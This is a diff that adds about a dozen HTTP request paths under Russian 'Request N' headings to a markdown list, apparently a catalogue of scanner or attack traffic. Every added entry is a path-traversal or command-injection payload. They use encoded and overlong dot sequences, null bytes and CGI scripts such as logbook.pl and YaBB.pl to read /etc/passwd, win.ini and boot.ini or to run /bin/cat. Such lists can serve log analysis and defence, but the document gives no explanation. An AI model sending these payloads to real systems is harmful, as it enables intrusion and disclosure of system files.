@@ -60,3 +60,56 @@
 ```http
 /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
 ```
+### Запрос 12
+/scripts/logbook.pl?file=../../../../../../../../../../bin/cat%20/etc/passwd%00|
+
+
+### Запрос 13
+```http
+/media/com_sppagebuilder/assets/iconfont/images/nkh3txpz/logbook.pl?file=../../../../../../../../../../bin/cat%20/etc/passwd%00|
+```
+
+### Запрос 14
+```http
+/.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./windows/win.ini
+```
+
+### Запрос 15
+```http
+/.../.../.../.../.../.../.../.../.../windows/win.ini
+```
+
+### Запрос 16
+```http
+/..../..../..../..../..../..../..../..../..../windows/win.ini
+```
+
+### Запрос 17
+```http
+/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./winnt/win.ini
+```
+
+### Запрос 18
+```http
+/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/windows/win.ini
+```
+
+### Запрос 19
+```http
+/..../..../..../..../..../..../..../..../..../..../..../..../etc/passwd
+```
+
+### Запрос 20
+```http
+/components/com_sppagebuilder/assets/css/YaBB.pl?board=news&action=display&num=../../../../../../etc/passwd%00
+```
+
+### Запрос 21
+```http
+/components/com_sppagebuilder/assets/css/search.cgi?..\..\..\..\..\..\windows\win.ini
+```
+
+### Запрос 22
+```http
+/ldap/cgi-bin/ldacgi.exe?Action=Substitute&Template=../../../../../boot.ini&Sub=LocalePath&LocalePath=enus1252
+```
